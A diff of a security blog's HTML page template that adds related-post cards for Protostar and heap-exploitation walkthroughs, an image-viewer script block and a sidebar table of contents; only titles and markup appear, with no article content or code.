+                <img src="/p/old_dlmalloc_unlink_tricks/cover.515456a69a68eda271ac6fd960db8941_hu507ad38ef06aa99c1060308c140897fe_358203_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Old Dlmalloc Unlink Tricks -REMASTERED-"
+                        data-key="old_dlmalloc_unlink_tricks" 
+                        data-hash="md5-UVRWpppo7aJxrG/ZYNuJQQ==">
+                
+            </div>
         
 
+        <div class="article-details">
+            <h2 class="article-title">Old Dlmalloc Unlink Tricks -REMASTERED-</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_final_2/">
         
-            
-                    <a class='page-link' href='/'>1</a>
+        
+            <div class="article-image">
+                <img src="/p/protostar_final_2/cover.15c57d537b2f0d4cccff3aa6a3057756_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Final 2 Walkthrough"
+                        data-key="protostar_final_2" 
+                        data-hash="md5-FcV9U3svDUzM/zqmowV3Vg==">
                 
-            
-            
-                    <a class='page-link' href='/page/2/'>2</a>
-                
-            
-            
-                <span class='page-link current'>3</span>
-                
-            
-    </nav>
+            </div>
+        
 
-<footer class="site-footer">
+        <div class="article-details">
+            <h2 class="article-title">Protostar Final 2 Walkthrough</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_heap_3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/protostar_heap_3/cover.b09b45c708dcdb755a7785f3a8bfab20_hucb530b82e8db4d6865287e2d39448560_744108_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Heap 3 Walkthrough"
+                        data-key="protostar_heap_3" 
+                        data-hash="md5-sJtFxwjc23Vad4XzqL&#43;rIA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Protostar Heap 3 Walkthrough</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_format_1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/protostar_format_1/cover.3055e76320895d583e5eb8b5b47454de_hu496a20f2b4777c05e734bfc6b70c220b_1249701_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 格式，参数，红宝石"
+                        data-key="protostar_format_1" 
+                        data-hash="md5-MFXnYyCJXVg&#43;Xri1tHRU3g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">格式，参数，红宝石</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
     
     
     <section class="powerby">
@@ -368,81 +1051,93 @@ if (!doNotTrack) {
     </section>
 </footer>
 
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
             </main>
     <aside class="sidebar right-sidebar sticky">
         
             
-                <form action="/search/" class="search-form widget" >
-        <p>
-            <label>搜索</label>
-            <input name="keyword" required placeholder="找点什么呢..." />
-        
-            <button title="搜索">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-            </button>
-        </p>
-    </form>
-            
-        
-            
-                <section class="widget archives">
+                
+    <section class="widget archives">
         <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">归档</h2>
-
-        
-        
-        
-        
-        
-        <div class="widget-archive--list">
-            <div class="archives-year">
-                    <a href="/archives/#2022">
-                        
-                            <span class="year">2022</span>
-                            <span class="count">7</span>
-                        
-                    </a> 
-                </div>
-            <div class="archives-year">
-                    <a href="/archives/#2021">
-                        
-                            <span class="year">2021</span>
-                            <span class="count">4</span>
-                        
-                    </a> 
-                </div>
-            <div class="archives-year">
-                    <a href="/archives/#1986">
-                        
-                            <span class="year">1986</span>
-                            <span class="count">1</span>
-                        
-                    </a> 
-                </div>
-            
-        </div>
-    </section>
-            
-        
-            
-                <section class="widget tagCloud">
-    <div class="widget-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
   <line x1="5" y1="9" x2="19" y2="9" />
   <line x1="5" y1="15" x2="19" y2="15" />
@@ -452,57 +1147,23 @@ if (!doNotTrack) {
 
 
 
-    </div>
-    <h2 class="widget-title section-title">分类</h2>
-
-    <div class="tagCloud-tags">
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
         
-            <a href="/categories/binary/" class="font_size_8">
-                Binary
-            </a>
-        
-            <a href="/categories/protostar/" class="font_size_6">
-                Protostar
-            </a>
-        
-            <a href="/categories/heap/" class="font_size_3">
-                Heap
-            </a>
-        
-            <a href="/categories/stack/" class="font_size_3">
-                Stack
-            </a>
-        
-            <a href="/categories/format/" class="font_size_2">
-                Format
-            </a>
-        
-            <a href="/categories/ruby/" class="font_size_2">
-                Ruby
-            </a>
-        
-            <a href="/categories/catchrubbish/" class="font_size_1">
-                CatchRubbish
-            </a>
-        
-            <a href="/categories/csharp/" class="font_size_1">
-                C#
-            </a>
-        
-            <a href="/categories/fusion/" class="font_size_1">
-                Fusion
-            </a>
-        
-            <a href="/categories/itunes/" class="font_size_1">
-                iTunes
-            </a>
-        
-            <a href="/categories/test/" class="font_size_1">
-                Test
-            </a>
-        
-    </div>
-</section>
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#level-01">Level 01</a></li>
+    <li><a href="#vulnerability">Vulnerability</a></li>
+    <li><a href="#stack-overflow">Stack Overflow</a></li>
+    <li><a href="#jmp-to-stack">Jmp to Stack</a></li>
+    <li><a href="#return-oriented-programming">Return Oriented Programming</a></li>
+    <li><a href="#calculate-offset">Calculate Offset</a></li>
+    <li><a href="#end">End</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
 
             
         
